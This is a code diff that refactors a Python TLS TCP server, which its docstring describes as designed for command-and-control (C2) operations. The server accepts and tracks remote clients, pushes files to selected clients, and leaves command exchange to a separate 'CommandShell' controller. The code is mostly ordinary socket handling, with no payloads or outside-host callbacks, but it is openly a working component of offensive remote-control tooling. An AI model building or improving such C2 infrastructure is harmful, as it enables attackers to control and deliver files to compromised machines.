@@ -2,186 +2,417 @@ import socket
 import ssl
 import threading
 import os
-import shutil
-from locking_mechanism import FileLock
+import time
+import logging
 
-
-class ClientHandler(threading.Thread):
-    def __init__(self, client_socket, client_address, server):
-        """
-        Handles communication with a single client in a separate thread.
-        """
-        super().__init__()
-        self.client_socket = client_socket  # The client's socket connection
-        self.client_address = client_address  # The client's address
-        self.server = server  # Reference to the main server
-
-    def run(self):
-        """
-        Handles the receiving and sending of messages for this client.
-        """
-        print(f"[+] Secure connection established with {self.client_address}")
-        self.server.add_client(self.client_address, self.client_socket)
-
-        try:
-            while True:
-                # Receive data from the client
-                data = self.client_socket.recv(1024).decode('utf-8')
-                if not data:
-                    break  # Exit loop if no data is received (client disconnected)
-                print(f"[Client {self.client_address}] {data}")
-                response = f"Echo: {data}"
-                # Send an echo response back to the client
-                self.client_socket.sendall(response.encode('utf-8'))
-        except ConnectionResetError:
-            print(f"[-] Connection lost with {self.client_address}")
-        finally:
-            # Remove client from active connections and close socket
-            self.server.remove_client(self.client_address)
-            self.client_socket.close()
-            print(f"[+] Connection closed for {self.client_address}")
-
+# --- Basic Logging Setup ---
+# Configure logging for the server module
+log_format = '%(asctime)s - %(threadName)s - %(levelname)s - %(message)s'
+logging.basicConfig(level=logging.INFO, format=log_format)
+# You might want to direct server logs to a different file than the shell
+# handler = logging.FileHandler("server.log")
+# handler.setFormatter(logging.Formatter(log_format))
+# server_logger = logging.getLogger(__name__)
+# server_logger.addHandler(handler)
+# server_logger.propagate = False # Prevent double logging if root logger also has handlers
+# Use standard logging for simplicity here:
+server_logger = logging.getLogger()
 
 
 class TCPServer:
-    def __init__(self, host=None, port=None, certfile='../ssl_deets/server.crt', keyfile='../ssl_deets/server.key'):
+    """
+    A thread-safe TLS-enabled TCP server designed for C2 operations.
+    Handles client connections, provides mechanisms for listing clients,
+    sending files, and disconnecting clients safely. Interaction logic
+    (command sending/receiving) is expected to be handled by the controller
+    (e.g., CommandShell) using the client sockets retrieved via get_clients().
+    """
+    def __init__(self, host="0.0.0.0", port=8000, certfile='server.crt', keyfile='server.key'):
         """
-        Initializes the TCP server with SSL encryption.
+        Initializes the server.
+
+        Args:
+            host (str): Host address to bind to.
+            port (int): Port number to listen on.
+            certfile (str): Path to the SSL certificate file.
+            keyfile (str): Path to the SSL key file.
         """
+        self.host = host
+        self.port = port
+        self.certfile = certfile
+        self.keyfile = keyfile
+        self.server_socket = None # The main listening socket
+        # Stores { address: (socket, connection_time) }
+        self.clients = {}
+        # Lock for ensuring thread-safe access to the clients dictionary
+        self._clients_lock = threading.Lock()
+        # Event to signal the server's main loop to stop gracefully
+        self._stop_event = threading.Event()
 
-        self.host = host if host is not None else "0.0.0.0"
-        self.port = port if port is not None else 8000
+        # --- SECURITY WARNING ---
+        server_logger.warning("TCPServer initialized WITHOUT client authentication (e.g., mutual TLS).")
+        server_logger.warning("Ensure client authentication is implemented if required for security.")
+        # --- END SECURITY WARNING ---
 
-        self.max_clients = 10
-        self.client_keys = {}
-        self.clients = {}  # Dictionary to store active client connections
-        self.current_client = None  # Stores the currently selected client for communication
+    def start(self, started_event):
+        """
+        Starts the server's main listening loop. This should be run in a thread.
+        Signals the provided 'started_event' when successfully bound and listening.
 
-        # Create a standard TCP socket
-        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.bind((self.host, self.port))
-        self.server_socket.listen(self.max_clients)
+        Args:
+            started_event (threading.Event): An event object that will be set
+                                             when the server is ready to accept connections.
+        Raises:
+            ssl.SSLError: If certificate/key loading fails.
+            OSError: If binding/listening fails.
+            Exception: For other unexpected errors during startup.
+        """
+        server_logger.info(f"Initializing secure server on {self.host}:{self.port}...")
+        try:
+            # 1. Create SSL Context
+            # Use PROTOCOL_TLS_SERVER for modern compatibility, automatically negotiates highest version
+            # *** FIX APPLIED HERE ***
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            # ************************
+            # Load server certificate and private key
+            context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
+            # Optional: Set preferred ciphers (example)
+            # context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:!aNULL:!eNULL:!MD5:!DSS')
 
-        # Wrap the socket with SSL for secure communication
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        context.load_cert_chain(certfile=certfile, keyfile=keyfile)
+            # --- Optional: Client Certificate Verification (Mutual TLS) ---
+            # To enable, uncomment and provide CA cert path:
+            # context.verify_mode = ssl.CERT_REQUIRED
+            # context.load_verify_locations(cafile='path/to/client_ca_bundle.pem')
+            # server_logger.info("Client certificate verification enabled (Mutual TLS).")
+            # --- End Optional ---
 
-        # Wrap the socket with SSL for secure communication
-        self.server_socket = context.wrap_socket(self.server_socket, server_side=True)
 
-        print(f"[*] Secure server started on {self.host}:{self.port}")
+            # 2. Create and Bind Socket
+            bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Allow address reuse quickly after server restart
+            bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            bindsocket.bind((self.host, self.port))
+            bindsocket.listen(5) # Listen backlog of 5 connections
+            server_logger.info(f"Socket bound to {self.host}:{self.port} and listening.")
+
+
+            # 3. Wrap Listening Socket with TLS
+            self.server_socket = context.wrap_socket(bindsocket, server_side=True)
+            server_logger.info("Server socket wrapped with TLS.")
+
+
+            # 4. Signal Server Readiness <<-- Fix for Startup Synchronization
+            started_event.set()
+            server_logger.info("Server startup complete. Ready to accept connections.")
+
+
+            # 5. Main Accept Loop <<-- Fix for Graceful Shutdown
+            self._stop_event.clear()
+            while not self._stop_event.is_set():
+                 try:
+                     # Set a timeout on accept() to allow checking the stop event periodically
+                     self.server_socket.settimeout(1.0) # Check every 1 second
+                     try:
+                          # Accept new connection
+                          client_socket, client_address = self.server_socket.accept()
+                          # Important: Reset timeout after successful accept
+                          self.server_socket.settimeout(None)
+
+                          server_logger.info(f"Accepted connection from {client_address}")
+                          # Add client to the managed dictionary <<-- Stores Timestamp
+                          self.add_client(client_address, client_socket)
+
+                     except socket.timeout:
+                          # Timeout is expected, just loop again to check stop_event
+                          continue
+                     except (ssl.SSLError, ConnectionAbortedError, OSError) as accept_err:
+                          # Handle errors during the accept process
+                          server_logger.error(f"Error accepting connection: {accept_err}", exc_info=False) # Avoid excessive logging detail in loop
+                          time.sleep(0.5) # Prevent fast spinning on repeated errors
+                          continue # Try accepting again
+
+                 except Exception as inner_e:
+                      # Catch unexpected errors within the loop itself
+                      server_logger.error(f"Critical error in server accept loop: {inner_e}", exc_info=True)
+                      # Decide if error is fatal or recoverable
+                      # For simplicity here, we'll break the loop on unexpected errors
+                      break
+
+        except (ssl.SSLError, OSError, socket.error) as e:
+            server_logger.critical(f"Fatal server initialization error: {e}", exc_info=True)
+            started_event.set() # Signal event anyway so caller doesn't hang forever
+            raise # Re-raise the exception to be caught by the calling thread runner
+        except Exception as e:
+            server_logger.critical(f"Unexpected fatal server error during startup: {e}", exc_info=True)
+            started_event.set() # Signal event anyway
+            raise
+        finally:
+            server_logger.info("Server accept loop terminating.")
+            # Final cleanup of the main server socket
+            if self.server_socket:
+                 try:
+                     self.server_socket.close()
+                     self.server_socket = None
+                     server_logger.info("Main server socket closed.")
+                 except Exception as close_err:
+                     server_logger.error(f"Error closing main server socket: {close_err}", exc_info=True)
 
     def add_client(self, address, client_socket):
         """
-        Stores the client connection in the active clients dictionary.
-        """
-        self.clients[address] = client_socket
-        print(f"[*] Client {address} added to active connections")
+        Adds a client connection to the internal dictionary, including connection time. Thread-safe.
 
-    def remove_client(self, address):
+        Args:
+            address (tuple): The client's address (ip, port).
+            client_socket (socket.socket): The client's socket object (TLS wrapped).
         """
-        Removes the client from the active clients dictionary when they disconnect.
-        """
-        if address in self.clients:
-            del self.clients[address]
-            print(f"[*] Client {address} removed from active connections")
+        connection_time = time.time() # <<-- Fix: Store Timestamp
+        with self._clients_lock: # <<-- Fix: Thread Safety
+            self.clients[address] = (client_socket, connection_time)
+        server_logger.info(f"Client {address} added to active connections at {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(connection_time))}.")
 
-    def switch_connection(self, target_address):
+    def disconnect_client(self, address):
         """
-        Allows switching between connected clients.
-        """
-        if target_address in self.clients:
-            self.current_client = self.clients[target_address]
-            print(f"[*] Switched to client {target_address}")
-        else:
-            print(f"[!] Client {target_address} not found")
+        Gracefully closes a client's socket and removes it from the active connections map. Thread-safe.
 
-    def send_command(self, command):
+        Args:
+            address (tuple): The address (ip, port) of the client to disconnect.
+
+        Returns:
+            bool: True if the client was found and disconnection was attempted, False otherwise.
         """
-        Sends a command to the currently selected client.
-        """
-        if self.current_client:
+        server_logger.info(f"Attempting to disconnect client {address}...")
+        socket_to_close = None
+        with self._clients_lock: # <<-- Fix: Thread Safety
+             # Use pop to atomically get the socket and remove the entry
+             client_info = self.clients.pop(address, None) # Returns None if key doesn't exist
+             if client_info:
+                  socket_to_close, _ = client_info # Unpack the tuple
+                  server_logger.info(f"Client {address} removed from active map for disconnection.")
+             else:
+                  server_logger.warning(f"Attempted to disconnect client {address}, but it was not found in the active map.")
+                  return False # Client not found
+
+        # Perform socket operations outside the lock
+        if socket_to_close:
             try:
-                self.current_client.sendall(command.encode('utf-8'))
-                self.current_client.recv(4096)
+                # Politely ask the socket to shut down read/write operations
+                # This might fail if the socket is already dead, which is fine.
+                socket_to_close.shutdown(socket.SHUT_RDWR)
+            except (OSError, socket.error, ssl.SSLError) as shutdown_err:
+                 # Log non-critical errors during shutdown
+                 server_logger.debug(f"Socket shutdown error for {address} (may be okay): {shutdown_err}")
             except Exception as e:
-                print(f"[!] Error sending command: {e}")
-        else:
-            print("[!] No client selected. Use switch_connection() first.")
+                 server_logger.error(f"Unexpected error during socket shutdown for {address}: {e}")
 
-    def start(self):
-        """
-        Starts the server to accept and handle client connections.
-        """
-        if not os.path.exists('keys'):
-            os.makedirs('keys')
-            print("[+] 'keys' storage created.")
+            try:
+                # Close the socket resource
+                socket_to_close.close()
+                server_logger.info(f"Socket closed successfully for {address}")
+                return True # Indicate disconnection attempt was made
+            except (OSError, socket.error, ssl.SSLError) as close_err:
+                server_logger.error(f"Error closing socket for {address}: {close_err}", exc_info=True)
+                return False # Indicate failure during close
+            except Exception as e:
+                 server_logger.error(f"Unexpected error closing socket for {address}: {e}")
+                 return False
         else:
-            print("[+] 'keys' director already exists.")
+             # This case should technically not be reached due to the check above, but added for safety
+             return False
+
+
+    def get_clients(self):
+        """
+        Returns a copy of the current clients dictionary. Thread-safe.
+
+        Returns:
+            dict: A dictionary containing { address: (socket, connection_time) }
+        """
+        with self._clients_lock: # <<-- Fix: Thread Safety
+            # Return a copy so the caller can iterate without holding the lock
+            return self.clients.copy()
+
+    def send_file(self, local_filepath, client_address):
+        """
+        Sends a file to a specific client using a simple header protocol. Thread-safe.
+
+        Args:
+            local_filepath (str): The path to the file on the server to send.
+            client_address (tuple): The address of the target client.
+
+        Returns:
+            bool: True if the file was sent successfully, False otherwise.
+        """
+        server_logger.info(f"Request to send file '{local_filepath}' to {client_address}")
+        socket_to_use = None
+        # 1. Get socket safely
+        with self._clients_lock: # <<-- Fix: Thread Safety
+            client_info = self.clients.get(client_address) # Use get for safe lookup
+            if client_info:
+                socket_to_use, _ = client_info
+            else:
+                server_logger.error(f"send_file failed: Client {client_address} not found.")
+                return False
+
+        # 2. Perform sending outside the lock
         try:
-            while True:
-                # Accept a new client connection
-                client_socket, client_address = self.server_socket.accept()
-                #create public and private key for the client and store its location
-                identifier = str(client_address)
-                locker = FileLock(identifier)
-                locker.create_pub_key()
-                locker.create_priv_key()
-                self.client_keys[identifier] = f"{keys}/{identifier}"
-                # Create a new thread for the client
-                client_handler = ClientHandler(client_socket, client_address, self)
-                client_handler.start()
-        except KeyboardInterrupt:
-            print("\n[!] Server shutting down...")
-        finally:
-            # Close the server socket before shutting down
-            if os.path.exists('keys'):
-                shutil.rmtree('keys')
-                print("[+] 'keys' store removed.")
-            self.server_socket.close()
-            print("[*] Secure server closed")
+            # Check file exists before proceeding
+            if not os.path.isfile(local_filepath):
+                 server_logger.error(f"send_file failed: Local file not found: {local_filepath}")
+                 return False
+
+            filesize = os.path.getsize(local_filepath)
+            filename = os.path.basename(local_filepath)
+
+            # <<-- Fix: Simple File Transfer Protocol Header -->>
+            header = f"FILE {filename} {filesize}\n".encode('utf-8')
+            server_logger.debug(f"Sending header to {client_address}: {header.decode()}")
+            socket_to_use.sendall(header)
+
+            # Optional: Could add a step here to wait for client ACK "READY" before sending data
+
+            server_logger.info(f"Sending file data for '{filename}' ({filesize} bytes) to {client_address}")
+            sent_bytes = 0
+            with open(local_filepath, 'rb') as f:
+                while chunk := f.read(4096): # Read and send in chunks
+                    socket_to_use.sendall(chunk)
+                    sent_bytes += len(chunk)
+            server_logger.info(f"Finished sending file '{filename}' ({sent_bytes}/{filesize} bytes) to {client_address}")
+            return True
+
+        except FileNotFoundError:
+             # This check is redundant now but kept for safety
+             server_logger.error(f"send_file failed: Local file not found: {local_filepath}")
+             return False
+        except (socket.error, ssl.SSLError, BrokenPipeError, ConnectionResetError) as e:
+             server_logger.error(f"send_file failed: Socket error sending to {client_address}: {e}", exc_info=True)
+             # Assume client is dead on send error, attempt cleanup
+             self.disconnect_client(client_address)
+             return False
+        except Exception as e:
+             server_logger.error(f"send_file failed: Unexpected error sending to {client_address}: {e}", exc_info=True)
+             # Attempt cleanup on unexpected errors too
+             self.disconnect_client(client_address)
+             return False
 
     def stop(self):
         """
-        Stops the server abruptly by closing the server socket and all client connections.
+        Signals the server thread to stop accepting new connections and disconnects
+        all currently connected clients gracefully. Thread-safe.
         """
-        print("[!] Stopping server abruptly...")
+        server_logger.info("Stop requested. Signaling server loop to exit...")
+        # 1. Signal the accept loop to stop <<-- Fix for Graceful Shutdown
+        self._stop_event.set()
 
-        # Check if there are active client connections
-        if len(self.clients) > 0:
-            for address, client_socket in self.clients.items():
+        # 2. Close the main server socket to interrupt accept() immediately <<-- Fix
+        # Needs to be done carefully to avoid race conditions if called multiple times
+        server_sock_ref = self.server_socket
+        if server_sock_ref:
+            try:
+                # Optional: Attempt to unblock accept() by connecting briefly to self
+                # Works only if host is not 0.0.0.0 or if connecting to 127.0.0.1 works
+                unblock_host = self.host if self.host != '0.0.0.0' else '127.0.0.1'
                 try:
-                    client_socket.close()
-                    print(f"[+] Connection closed for {address}")
-                except Exception as e:
-                    print(f"[!] Error closing connection for {address}: {e}")
-        # Clear the clients dictionary
-        self.clients.clear()
+                    # Use a timeout to prevent waiting too long if connection fails
+                    with socket.create_connection((unblock_host, self.port), timeout=0.1) as temp_sock:
+                        server_logger.debug("Briefly connected to self to potentially unblock accept().")
+                except Exception:
+                    server_logger.debug("Could not connect to self to unblock accept (may be okay).")
 
-        # Close the server socket
-        try:
-            shutil.rmtree('keys')
-            self.server_socket.close()
-            print("[*] Server socket closed")
-        except Exception as e:
-            print(f"[!] Error closing server socket: {e}")
+                server_sock_ref.close()
+                server_logger.info("Main server listening socket closed.")
+                self.server_socket = None # Clear reference
+            except (OSError, socket.error) as e:
+                 server_logger.error(f"Error closing server listening socket during stop: {e}", exc_info=True)
 
-        print("[*] Server stopped abruptly")
+        # 3. Disconnect all active clients <<-- Fix for Graceful Shutdown & Thread Safety
+        server_logger.info("Closing all active client connections...")
+        # Get a snapshot of addresses to avoid issues while modifying the dictionary
+        client_addresses = list(self.get_clients().keys()) # get_clients() is thread-safe
+        disconnected_count = 0
+        for address in client_addresses:
+            # disconnect_client is thread-safe and handles removal+close
+            if self.disconnect_client(address):
+                 disconnected_count += 1
+
+        server_logger.info(f"Server stop sequence complete. Closed {disconnected_count}/{len(client_addresses)} client connections.")
+
+    # --- Deprecated/Removed Methods ---
+    # These methods are removed as they relied on internal state ('current_client')
+    # and had problematic implementations (e.g., recv in send). The CommandShell
+    # should interact directly with client sockets obtained via get_clients().
+
+    # def switch_connection(self, target_address):
+    #     raise NotImplementedError("switch_connection is deprecated. Use get_clients() and interact directly.")
+
+    # def send_command(self, command):
+    #     raise NotImplementedError("send_command is deprecated. Use get_clients() and interact directly.")
+
+    # def receive_command(self, buffer_size=1024):
+    #     raise NotImplementedError("receive_command is deprecated. Use get_clients() and interact directly.")
 
 
-    def send_file(self, filename, client_address):
-        """
-        Sends a file to the specified client.
-        """
-        if client_address not in self.clients:
-            print(f"[!] Client {client_address} not found")
-            return
+# Example of how the CommandShell would start this server (simplified)
+if __name__ == '__main__':
+    print("This script provides the TCPServer class.")
+    print("It should be imported and managed by a controller script (like CommandShell).")
+    print("Example: Starting a dummy server for testing (will shut down shortly)...")
 
-        client_socket = self.clients[client_address]
-        try:
-            with open(filename, 'rb') as file:
-                while chunk := file.read(1024):
-                    client_socket.sendall(chunk)
-            print(f"[+] File '{filename}' sent to {client_address}")
-        except Exception as e:
-            print(f"[!] Error sending file: {e}")
+    # Example self-test (not intended for production run)
+    # Ensure these paths point to valid certificate and key files for testing
+    test_cert = '../ssl_deets/server.crt'
+    test_key = '../ssl_deets/server.key'
+
+    if not os.path.isfile(test_cert) or not os.path.isfile(test_key):
+         print(f"[!] ERROR: Test cert ({test_cert}) or key ({test_key}) not found.")
+         print("[!] Generate self-signed certs for testing or provide valid paths.")
+         exit(1) # Exit if certs are missing
+
+    server_ready_event = threading.Event()
+    server_instance = TCPServer(certfile=test_cert, keyfile=test_key)
+
+    server_thread = threading.Thread(target=server_instance.start, args=(server_ready_event,), name="TestServerThread", daemon=True)
+
+    try:
+        server_thread.start()
+
+        print("[*] Waiting for server to become ready...")
+        # Wait for the start method to signal the event
+        if server_ready_event.wait(timeout=10.0):
+             print("[+] Server reported ready!")
+             print("[*] Server will run for 15 seconds...")
+             time.sleep(15)
+             print("[*] Requesting server stop...")
+             server_instance.stop() # Request graceful shutdown
+             print("[*] Waiting for server thread to finish...")
+             # Wait for the server thread to actually terminate
+             server_thread.join(timeout=5.0)
+             if server_thread.is_alive():
+                 print("[!] Server thread did not exit cleanly after stop request.")
+             else:
+                  print("[+] Server thread finished.")
+        else:
+             print("[!] Server failed to start within timeout.")
+             # If the thread is alive but didn't signal, something is wrong
+             if server_thread.is_alive():
+                 print("[!] Server thread is running but did not signal ready event.")
+                 # Attempt to stop it anyway
+                 server_instance.stop()
+                 server_thread.join(timeout=2.0)
+
+    except KeyboardInterrupt:
+         print("\n[*] Keyboard interrupt received during test.")
+         if server_instance and server_thread.is_alive():
+             print("[*] Requesting server stop due to interrupt...")
+             server_instance.stop()
+             server_thread.join(timeout=5.0)
+
+    except Exception as e:
+         print(f"[!] An unexpected error occurred during the test: {e}")
+         # Attempt cleanup if possible
+         if server_instance and server_thread.is_alive():
+             try: server_instance.stop()
+             except: pass
+             try: server_thread.join(timeout=2.0)
+             except: pass
+
+    print("[*] Test finished.")
